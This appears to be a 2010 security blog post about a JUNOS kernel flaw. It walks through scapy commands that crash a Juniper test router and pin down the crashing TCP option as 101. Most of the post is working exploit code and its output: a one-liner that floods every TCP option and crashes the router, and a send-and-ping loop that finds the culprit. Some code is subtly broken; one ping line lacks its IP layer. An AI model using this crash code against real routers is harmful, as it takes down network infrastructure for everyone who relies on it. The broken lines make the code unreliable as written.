---
layout: page
title: Juniper Kernel Crash - scapy Code
categories: 
  - security
  - networking
  - programming
tags: 
  - juniper
  - tcp
  - option-101
  - networking
  - crash
  - junos
  - migrated
author: jrossi
teaser: |
    Code Following the Juniper kernel flaw posts, we received a number of inquiries regarding how 
    to determine the option value to use, however we were somewhat reluctant to provide 
    that level of detail. Now that [exploit code has been published](http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/) 
    elsewhere, there is little reason not to answer this question.
---


On January 6th, we wrote about [a JUNOS flaw](http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/) 
that caused a kernel crash in Juniper routers and demonstrated 
the [effect in action](http://praetorianprefect.com/archives/2010/01/junos-juniper-kernel-crash-video/) 
in a video. At the time Juniper was not making details of the advisory public, however since 
then [PSN-2010-01-623](http://osvdb.org/ref/61/juniper-PSN-2010-01-623.txt) has shown up on 
the Open Source Vulnerability Database under entry [61538](http://osvdb.org/61538).

Following the Juniper kernel flaw posts, we received a number of inquiries regarding how 
to determine the option value to use, however we were somewhat reluctant to provide 
that level of detail. Now that [exploit code has been published](http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/) 
elsewhere, there is little reason not to answer this question.

To test all possible TCP options using [scapy](http://www.secdev.org/projects/scapy/) 
(a python based packet manipulation program), first download the latest copy of 
scapy (including all library dependencies) from their 
[Mercurial code repository](http://hg.secdev.org/scapy/) as shown below:

~~~
$ hg clone http://hg.secdev.org/scapy/
$ cd scapy
$ python setup build
$ sudo python setup install
~~~

Start scapy as root:

~~~
$ sudo run_scapy
INFO: Can't import python gnuplot wrapper . Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: No route found for IPv6 destination :: (no default route?)
Welcome to Scapy (2.1.0-dev)
>>>
~~~

We started this particular test by first creating an IP packet with a destination of the Juniper test router instance named 'ipl'.

~~~ python
>>> ipl = IP(dst="172.17.20.102")
>>> ipl
~~~

Initially we tested all TCP options as fast as possible just to see if it was possible to reproduce the 
reported vulnerability (a kernel crash that causes the router to reboot).

~~~ python
>>> send([ipl/TCP(dport=23, options=[(x, "")])/"bye bye" for x in range(256)])
................................................................................................................
................................................................................................................
................................
Sent 256 packets.
~~~

The previous command created 255 packets with every possible TCP option, sent them all 
at once, and the router crashed. While this performed as expected, it only told us 
that we were on the right track (the advisory was correct, an option setting 
crashes the router), however it does not tell us which option.

The scapy tool can send a ping following each test packet to see if the router 
is still up and responding, as demonstrated:

~~~ python
>>> for x in range(255):
...   send(ipl/TCP(dport="22", options=[(x,"")])
...   if not sr1(/ICMP(), retry=-1, timeout=1, verbose=0):
...     print "we have a winner: %s"%(x)
...     break
...
we have a winner: 101
~~~

Now that we have a winner, we know which option value caused the kernel crash 
Juniper reported.
